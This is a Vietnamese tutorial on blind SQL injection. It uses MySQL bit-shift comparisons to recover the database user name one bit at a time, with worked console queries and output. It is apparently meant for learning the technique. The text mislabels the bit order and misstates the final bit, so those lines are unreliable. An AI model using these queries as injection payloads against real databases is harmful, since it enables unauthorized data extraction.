# Kỹ thuật khai thác blind sử dụng dịch bit

## Ý tưởng

Mỗi một ký tự đều được quy đổi sang mã ASCII. Và nó được biểu diễn bằng 7 bits. Như vậy thay vì chúng ta phải thử lần lượt các ký tự trong bảng mã ASCII (có gần 100 ký tự có thể nhìn thấy được). Như vậy chúng ta có thể thử đến gần 100 lần để lấy ra được 1 ký tự. Nhưng với cách dịch bit với mỗi ký tự ta chỉ cần 7 lần thử. Sử dụng kỹ thuật này cho phép lấy ra từng bit của ký tự. 

## Ví dụ

Với ký tự `r` chuyển sang mã ASCII sẽ là `114` và chuyển sang bit sẽ là `1110010`

```
mysql> select (ascii((substr(user(),1,1))) >> 6)=1;
+--------------------------------------+
| (ascii((substr(user(),1,1))) >> 6)=1 |
+--------------------------------------+
|                                    1 |
+--------------------------------------+
1 row in set (0.00 sec)
```

Ở đây ta sẽ xác định lần lượt các bit từ phải sang trái. Ta giảm số `6` ở câu query dần về đến `0` để để lần lượt xác định các bit. Ta thực hiện so sánh nếu đúng sẽ trả lại cho ta giá trị là `1` còn sai thì kết quả trả về sẽ là `0`. Như kết quả trên bit đầu tiên tính từ phải sang sẽ là `1`.

1xxxxxx

Xác định bit tiếp theo thì kết quả có thể là 

10 = 2 hoặc 11 = 3

```
mysql> select (ascii((substr(user(),1,1))) >> 5)=2;
+--------------------------------------+
| (ascii((substr(user(),1,1))) >> 5)=2 |
+--------------------------------------+
|                                    0 |
+--------------------------------------+
1 row in set (0.00 sec)
```

Ta thấy ở đây là sai nên bit thứ 2 xác định được sẽ là 1

11xxxxx

Xác định kết quả tiếp theo trả về có thể là

110 = 6 hoặc 111 = 7

```
mysql> select (ascii((substr(user(),1,1))) >> 4)=6;
+--------------------------------------+
| (ascii((substr(user(),1,1))) >> 4)=6 |
+--------------------------------------+
|                                    0 |
+--------------------------------------+
1 row in set (0.00 sec)
```

Kết quả là sai nên bit thứ 3 là 1

111xxxx

Xác định kết quả trả về tiếp theo có thể

1110 = 14 hoặc 1111 = 15

```
mysql> select (ascii((substr(user(),1,1))) >> 3)=14;
+---------------------------------------+
| (ascii((substr(user(),1,1))) >> 3)=14 |
+---------------------------------------+
|                                     1 |
+---------------------------------------+
1 row in set (0.00 sec)
```

Kết quả là đúng nên bit thứ 4 là 0

1110xxx

Xác định kết quả trả về tiếp theo là

11100 = 28 hoặc 11101 = 29

```
mysql> select (ascii((substr(user(),1,1))) >> 2)=28;
+---------------------------------------+
| (ascii((substr(user(),1,1))) >> 2)=28 |
+---------------------------------------+
|                                     1 |
+---------------------------------------+
1 row in set (0.00 sec)
```

Kết quả đúng nên bit thứ 5 là 0

11100xx

Kết quả tiếp theo là 

111000 = 56 hoặc 111001 = 57

```
mysql> select (ascii((substr(user(),1,1))) >> 1)=56;
+---------------------------------------+
| (ascii((substr(user(),1,1))) >> 1)=56 |
+---------------------------------------+
|                                     0 |
+---------------------------------------+
1 row in set (0.00 sec)
```

Kết quả sai nên bit thứ 6 là 1

111001x

Kết quả tiếp theo là 

1110010 = 114 hoặc 1110011 = 115

```
mysql> select (ascii((substr(user(),1,1))) >> 0)=114;
+----------------------------------------+
| (ascii((substr(user(),1,1))) >> 0)=114 |
+----------------------------------------+
|                                      1 |
+----------------------------------------+
1 row in set (0.00 sec)
```

Kết quả đúng nên bit cuối là 1

Như vậy ký tự đầu tiên của user có giá trị bit là `1110010`. Từ đây ta xác định được đây là ký tự `r`

```
mysql> select b'1110010';
+------------+
| b'1110010' |
+------------+
| r          |
+------------+
1 row in set (0.00 sec)
```

Tương tự ta xác đinh các ký tự tiếp theo